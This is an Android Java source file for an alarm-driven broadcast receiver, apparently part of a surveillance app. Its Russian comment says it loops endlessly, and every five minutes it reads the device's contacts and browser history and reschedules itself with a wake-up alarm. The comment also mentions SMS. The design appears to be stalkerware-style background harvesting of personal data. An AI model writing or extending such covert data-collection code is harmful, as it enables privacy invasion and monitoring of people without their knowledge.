package com.postal.omniscient.postal.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import com.postal.omniscient.postal.browser.history.BrowserHistory;
import com.postal.omniscient.postal.reader.contact.ReadContacts;

/** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 5 мин записуем
 *  контакты ,смс и браузера историю*/
public class AlarmReceiver extends BroadcastReceiver {
    public AlarmReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

//        Uri uri = Uri.parse(Environment.getExternalStorageDirectory().getAbsolutePath() + "/media/ringtone/sao.mp3");
//        Ringtone ringtone = RingtoneManager.getRingtone(context, uri);
//        ringtone.play();
//        Log.i("MyMsg", "VSE PROPALLLLLLLOOOOOO");
        ReadContacts contact = new ReadContacts(context);
        BrowserHistory browser = new BrowserHistory(context.getContentResolver());
            contact.getContacts();
            browser.historyToJson();
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
        Intent myIntent = new Intent(context, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, myIntent, 0);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+ 1000*60*5, pendingIntent);


    }
}
